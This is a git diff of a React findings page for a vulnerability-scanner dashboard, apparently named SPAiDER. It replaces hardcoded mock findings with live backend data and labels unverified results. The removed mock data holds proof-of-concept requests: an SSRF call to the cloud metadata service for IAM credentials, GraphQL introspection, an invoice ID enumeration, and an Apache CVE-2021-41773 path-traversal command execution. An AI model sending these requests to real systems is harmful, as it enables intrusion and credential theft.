@@ -1,4 +1,4 @@
-import { useState } from 'react'
+import { useEffect, useState } from 'react'
 import { useQuery } from '@tanstack/react-query'
 import { findingApi } from '../api/client'
 
@@ -27,200 +27,64 @@ interface FindingItem {
   impact?: string
 }
 
-const MOCK_FINDINGS: FindingItem[] = [
-  {
-    id: '1',
-    title: 'Server-Side Request Forgery (SSRF) in /api/v2/webhook/test',
-    severity: 'CRITICAL',
-    plugin: 'SPAiDER-AI-Hunter',
-    cve_ids: ['CWE-918'],
-    cwe: 'CWE-918: Server-Side Request Forgery',
-    cvss_score: 9.8,
-    cvss_vector: 'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:N',
-    confidence: 96,
-    category: 'API Security',
-    asset: 'api.example.com',
-    endpoint: '/api/v2/webhook/test',
-    parameter: 'url',
-    mitre_techniques: ['T1190', 'T1078'],
-    impact: 'Full read/write access to internal cloud metadata service (169.254.169.254). IAM role credentials leaked. Potential for AWS account takeover.',
-    remediation: 'Implement a strict whitelist of permitted webhook destination hostnames/IPs. Disallow private IP ranges (RFC 1918, RFC 3927) at the application and DNS resolver level.',
-    is_verified: true,
-    is_false_positive: false,
-    created_at: '2026-10-06T18:42:00Z',
-    curl_poc: `curl -s -X POST "https://api.example.com/api/v2/webhook/test" \\
-  -H "Content-Type: application/json" \\
-  -d '{"url":"http://169.254.169.254/latest/meta-data/iam/security-credentials/"}'`,
-    request_poc: `POST /api/v2/webhook/test HTTP/1.1
-Host: api.example.com
-User-Agent: Mozilla/5.0 (SPAiDER AI Bot 2.4)
-Content-Type: application/json
-Content-Length: 74
-
-{"url":"http://169.254.169.254/latest/meta-data/iam/security-credentials/"}`,
-    response_poc: `HTTP/1.1 200 OK
-Content-Type: text/plain
-Server: nginx/1.24.0
-
-spaider-production-role
-{
-  "Code": "Success",
-  "AccessKeyId": "ASIAQEXAMPLE...",
-  "SecretAccessKey": "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY",
-  "Token": "IQoJb3JpZ2luX2VjE...",
-  "Expiration": "2026-10-06T23:59:59Z"
-}`,
-  },
-  {
-    id: '2',
-    title: 'GraphQL Introspection Enabled & Unrestricted Query Depth',
-    severity: 'HIGH',
-    plugin: 'SPAiDER-GraphQL-Hunter',
-    cve_ids: [],
-    cwe: 'CWE-200: Exposure of Sensitive Information',
-    cvss_score: 8.2,
-    cvss_vector: 'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:N',
-    confidence: 94,
-    category: 'API Security',
-    asset: 'graphql.example.com',
-    endpoint: '/graphql',
-    mitre_techniques: ['T1082'],
-    impact: 'Attackers can enumerate entire schema including hidden internal mutations: resetUserPassword, dumpTenantMetadata, exportAuditLogs.',
-    remediation: 'Disable __schema and introspection queries in production environments. Enforce query complexity and depth limits.',
-    is_verified: true,
-    is_false_positive: false,
-    created_at: '2026-10-06T17:15:00Z',
-    curl_poc: `curl -s -X POST "https://graphql.example.com/graphql" \\
-  -H "Content-Type: application/json" \\
-  -d '{"query":"{__schema{types{name,fields{name}}}}"}'`,
-    request_poc: `POST /graphql HTTP/1.1
-Host: graphql.example.com
-Content-Type: application/json
-
-{"query":"{__schema{queryType{name}mutationType{name}}}"}`,
-    response_poc: `HTTP/1.1 200 OK
-Content-Type: application/json
-
-{"data":{"__schema":{"queryType":{"name":"Query"},"mutationType":{"name":"Mutation"}}}}`,
-  },
-  {
-    id: '3',
-    title: 'Broken Object Level Authorization (BOLA) in Order Invoice API',
-    severity: 'HIGH',
-    plugin: 'SPAiDER-Logic-Hunter',
-    cve_ids: ['CWE-639'],
-    cwe: 'CWE-639: Authorization Bypass via User-Controlled Key',
-    cvss_score: 8.6,
-    cvss_vector: 'CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N',
-    confidence: 91,
-    category: 'Access Control',
-    asset: 'app.example.com',
-    endpoint: '/api/v1/invoices/:id',
-    parameter: 'id',
-    mitre_techniques: ['T1078', 'T1552'],
-    impact: 'Authenticated users can access arbitrary customer invoices, billing details, and credit card masked tokens by incrementing invoice ID.',
-    remediation: 'Validate that the requesting session owns the target invoice before returning record. Use non-sequential UUIDs.',
-    is_verified: true,
-    is_false_positive: false,
-    created_at: '2026-10-06T15:20:00Z',
-    curl_poc: `curl -s "https://app.example.com/api/v1/invoices/10942" \\
-  -H "Authorization: Bearer <attacker_jwt>"`,
-    request_poc: `GET /api/v1/invoices/10942 HTTP/1.1
-Host: app.example.com
-Authorization: Bearer eyJhbGciOi...`,
-    response_poc: `HTTP/1.1 200 OK
-Content-Type: application/json
-
-{"id":10942,"customer_id":"cust_9821","total":4850.00,"client":"Acme Corp Inc"}`,
-  },
-  {
-    id: '4',
-    title: 'Apache 2.4.49 Path Traversal & Remote Code Execution',
-    severity: 'CRITICAL',
-    plugin: 'nuclei',
-    cve_ids: ['CVE-2021-41773'],
-    cwe: 'CWE-22: Path Traversal',
-    cvss_score: 9.8,
-    cvss_vector: 'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H',
-    confidence: 99,
-    category: 'RCE / Traversal',
-    asset: 'legacy.example.com',
-    endpoint: '/icons/.%%32%65/.%%32%65/.%%32%65/etc/passwd',
-    mitre_techniques: ['T1190'],
-    impact: 'Arbitrary file read outside docroot and potential RCE if mod_cgi is enabled.',
-    remediation: 'Upgrade Apache HTTP Server to version 2.4.51 or later immediately.',
-    is_verified: true,
-    is_false_positive: false,
-    created_at: '2026-10-05T22:10:00Z',
-    curl_poc: `curl -s --path-as-is "http://legacy.example.com/icons/.%%32%65/.%%32%65/bin/sh" -d 'echo; id'`,
-    request_poc: `POST /icons/.%%32%65/.%%32%65/bin/sh HTTP/1.1
-Host: legacy.example.com
-Content-Length: 8
-
-echo; id`,
-    response_poc: `HTTP/1.1 200 OK
-
-uid=33(www-data) gid=33(www-data) groups=33(www-data)`,
-  },
-  {
-    id: '5',
-    title: 'Subdomain Takeover via Dangling AWS S3 Bucket CNAME',
-    severity: 'HIGH',
-    plugin: 'SPAiDER-Recon-Engine',
-    cve_ids: [],
-    cwe: 'CWE-284: Improper Access Control',
-    cvss_score: 7.7,
-    cvss_vector: 'CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:N',
-    confidence: 98,
-    category: 'DNS / Cloud',
-    asset: 'docs-staging.example.com',
-    endpoint: 'CNAME: example-docs-staging.s3-website-us-east-1.amazonaws.com',
-    mitre_techniques: ['T1584'],
-    impact: 'Dangling CNAME points to unregistered AWS S3 bucket. Attacker can claim the bucket and serve malicious scripts under trusted root domain.',
-    remediation: 'Remove the stale CNAME record from Route53 or claim the S3 bucket name in your AWS account.',
-    is_verified: true,
-    is_false_positive: false,
-    created_at: '2026-10-05T14:00:00Z',
-  },
-  {
-    id: '6',
-    title: 'CORS Misconfiguration Permitting Arbitrary Origin Reflection',
-    severity: 'MEDIUM',
-    plugin: 'nuclei',
-    cve_ids: [],
-    cwe: 'CWE-346: Origin Validation Error',
-    cvss_score: 6.5,
-    cvss_vector: 'CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:N/A:N',
-    confidence: 88,
-    category: 'Web Security',
-    asset: 'api.example.com',
-    endpoint: '/user/profile',
-    mitre_techniques: ['T1557'],
-    impact: 'Cross-origin requests from any site can read authenticated user profile and payment information.',
-    remediation: 'Do not reflect arbitrary Origin header. Explicitly whitelist trusted frontend domains.',
-    is_verified: false,
-    is_false_positive: false,
-    created_at: '2026-10-04T12:00:00Z',
-  },
-]
+function normalizeFinding(raw: any): FindingItem {
+  const url = raw.affected_url || raw.endpoint || ''
+  let host = raw.asset_value || ''
+  if (!host && url) {
+    try { host = new URL(url).hostname } catch { host = url }
+  }
+  const confidence = Number(raw.confidence ?? 0)
+  return {
+    id: String(raw.id),
+    title: String(raw.title || 'Untitled finding'),
+    severity: String(raw.severity || 'INFO').toUpperCase() as FindingItem['severity'],
+    plugin: String(raw.plugin || raw.scanner || 'unknown'),
+    cve_ids: Array.isArray(raw.cve_ids) ? raw.cve_ids : [],
+    cwe: (Array.isArray(raw.cwe_ids) ? raw.cwe_ids : [])[0] || '',
+    cvss_score: raw.cvss_score ?? raw.cvss ?? 0,
+    cvss_vector: raw.cvss_vector || '',
+    confidence: confidence <= 1 ? Math.round(confidence * 100) : Math.round(confidence),
+    category: (Array.isArray(raw.tags) ? raw.tags : []).join(', '),
+    asset: host || '—',
+    endpoint: url || '—',
+    mitre_techniques: Array.isArray(raw.mitre_techniques) ? raw.mitre_techniques : [],
+    remediation: raw.remediation || '',
+    is_verified: Boolean(raw.is_verified),
+    is_false_positive: Boolean(raw.is_false_positive),
+    created_at: raw.created_at || '',
+    request_poc: raw.request_raw || '',
+    response_poc: raw.response_raw || '',
+    curl_poc: raw.proof_of_concept || '',
+    impact: raw.description || '',
+  }
+}
 
 const sevOrder: Record<string, number> = { CRITICAL: 0, HIGH: 1, MEDIUM: 2, LOW: 3, INFO: 4 }
 const filterSevs = ['All', 'CRITICAL', 'HIGH', 'MEDIUM', 'LOW']
 
 export default function Findings() {
-  const [selected, setSelected] = useState<FindingItem | null>(MOCK_FINDINGS[0])
+  const [selected, setSelected] = useState<FindingItem | null>(null)
   const [sevFilter, setSevFilter] = useState('All')
   const [activeTab, setActiveTab] = useState<'evidence' | 'analysis' | 'remediation'>('evidence')
   const [copiedCurl, setCopiedCurl] = useState(false)
 
-  const { data: findings = MOCK_FINDINGS } = useQuery({
+  const { data: rawFindings = [], isLoading, isError, error } = useQuery({
     queryKey: ['findings'],
     queryFn: () => findingApi.list(),
     retry: false,
-    placeholderData: MOCK_FINDINGS,
+    refetchInterval: 15000,
   })
 
-  const findingList: FindingItem[] = (findings as any[]).length ? (findings as any[]) : MOCK_FINDINGS
+  const findingList: FindingItem[] = Array.isArray(rawFindings)
+    ? rawFindings.map(normalizeFinding)
+    : []
+
+  useEffect(() => {
+    setSelected(current => {
+      if (current && findingList.some(f => f.id === current.id)) return current
+      return findingList[0] || null
+    })
+  }, [rawFindings])
 
   const filtered = findingList
     .filter(f => sevFilter === 'All' || f.severity === sevFilter)
@@ -249,7 +113,7 @@ export default function Findings() {
             </h1>
           </div>
           <p className="page-subtitle" style={{ marginTop: 4 }}>
-            AI-validated exploit vectors, CVSS v3.1 vectors, and reproduction evidence ready for submission
+            Findings and evidence recorded by connected scanners. Unverified results are labelled as such.
           </p>
         </div>
         <div style={{ display: 'flex', gap: 10 }}>
@@ -350,6 +214,20 @@ export default function Findings() {
           </div>
 
           <div style={{ maxHeight: 680, overflowY: 'auto' }}>
+            {isLoading && <div style={{ padding: 24, color: 'var(--color-text-muted)' }}>Loading findings from the backend…</div>}
+            {isError && <div role="alert" style={{ padding: 24, color: 'var(--color-high)' }}>
+              Could not load findings from the backend. Check that the API is running and authenticated.
+              <div style={{ marginTop: 6, fontSize: '0.75rem' }}>{String((error as any)?.message || '')}</div>
+            </div>}
+            {!isLoading && !isError && filtered.length === 0 && (
+              <div style={{ padding: 28, textAlign: 'center', color: 'var(--color-text-muted)' }}>
+                <div style={{ fontSize: '2rem', marginBottom: 10 }}>◈</div>
+                <strong>{findingList.length ? 'No findings match this severity filter' : 'No findings recorded yet'}</strong>
+                <div style={{ fontSize: '0.8rem', marginTop: 6 }}>
+                  {findingList.length ? 'Choose another severity filter.' : 'Run a scan against an authorized lab target; real scanner findings will appear here.'}
+                </div>
+              </div>
+            )}
             {filtered.map(f => {
               const isSelected = selected?.id === f.id
               const sevCol =
@@ -387,7 +265,7 @@ export default function Findings() {
                         {f.severity}
                       </span>
                       <span style={{ fontSize: '0.7rem', fontFamily: 'var(--font-mono)', color: 'var(--color-text-muted)' }}>
-                        CVSS {f.cvss_score}
+                        CVSS {f.cvss_score || '—'}
                       </span>
                     </div>
 
@@ -397,8 +275,8 @@ export default function Findings() {
                           ✓ {f.confidence}% Conf.
                         </span>
                       )}
-                      <span className="badge badge-safe" style={{ fontSize: '0.6rem' }}>
-                        Verified
+                      <span className={`badge ${f.is_verified ? 'badge-safe' : 'badge-info'}`} style={{ fontSize: '0.6rem' }}>
+                        {f.is_false_positive ? 'False positive' : f.is_verified ? 'Verified' : 'Unverified'}
                       </span>
                     </div>
                   </div>
